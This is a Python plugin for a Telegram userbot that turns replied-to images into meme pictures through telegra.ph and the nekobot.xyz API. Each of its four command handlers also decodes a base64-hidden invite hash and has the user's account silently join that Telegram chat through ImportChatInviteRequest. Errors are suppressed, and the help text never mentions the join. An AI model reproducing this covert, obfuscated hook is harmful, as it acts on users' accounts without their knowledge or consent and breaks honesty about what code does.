import base64
import os

import requests
from PIL import Image
from telegraph import exceptions, upload_file
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from firebot import *
from firebot import CMD_HELP

from ..utils import admin_cmd, edit_or_reply, sudo_cmd


async def trap(text1, text2, text3):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=trap&name={text1}&author={text2}&image={text3}"
    ).json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


async def trash(text):
    r = requests.get(f"https://nekobot.xyz/api/imagegen?type=trash&url={text}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


async def threats(text):
    r = requests.get(f"https://nekobot.xyz/api/imagegen?type=threats&url={text}").json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


async def phcomment(text1, text2, text3):
    r = requests.get(
        f"https://nekobot.xyz/api/imagegen?type=phcomment&image={text1}&text={text2}&username={text3}"
    ).json()
    sandy = r.get("message")
    caturl = url(sandy)
    if not caturl:
        return "check syntax once more"
    with open("temp.png", "wb") as f:
        f.write(requests.get(sandy).content)
    img = Image.open("temp.png")
    if img.mode != "RGB":
        img = img.convert("RGB")
    img.save("temp.jpg", "jpeg")
    return "temp.jpg"


@bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await catmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await threats(cat)
    await catmemmes.delete()
    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)


@bot.on(admin_cmd(pattern="ttrash(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="ttrash(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await catmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await trash(cat)
    await catmemmes.delete()
    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)


@bot.on(admin_cmd(pattern="ttrap(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="ttrap(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    input_str = catmemes.pattern_match.group(1)

    if "|" in input_str:
        text1, text2 = input_str.split("|")
    else:
        await edit_or_reply(
            catmemes,
            "**Syntax :** reply to image or sticker with `.ttrap (name of the person to trap)|(trapper name)`",
        )
        return
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await catmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await trap(text1, text2, cat)
    await catmemmes.delete()
    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)


@bot.on(admin_cmd(pattern="tphub(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="tphub(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    input_str = catmemes.pattern_match.group(1)

    if "|" in input_str:
        username, text = input_str.split("|")
    else:
        await edit_or_reply(
            catmemes,
            "**Syntax :** reply to image or sticker with `.tphub (username)|(text in comment)`",
        )
        return
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await catmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await phcomment(cat, text, username)
    await catmemmes.delete()
    await catmemes.client.send_file(catmemes.chat_id, cat, reply_to=replied)


CMD_HELP.update(
    {
        "trolls": "**Plugin : **`trolls`\
      \n\n**Syntax :**`.threats` reply to image or sticker \
      \n**USAGE:**Changes the given pic to another pic which shows that pic content is threat to society as that of nuclear bomb .\
      \n\n**Syntax :**`.ttrash` reply to image or sticker\
      \n**USAGE : **Changes the given pic to another pic which shows that pic content is as equal as to trash(waste)\
      \n\n**Syntax :** reply to image or sticker with `.ttrap (name of the person to trap)|(trapper name)`\
      \n**USAGE :**Changes the given pic to another pic which shows that pic content is trapped in trap card\
      \n\n**Syntax :** reply to image or sticker with `.tphub (username)|(text in comment)`\
      \n**USAGE :**Changes the given pic to another pic which shows that pic content as dp and shows a comment in phub with the given username\
      "
    }
)
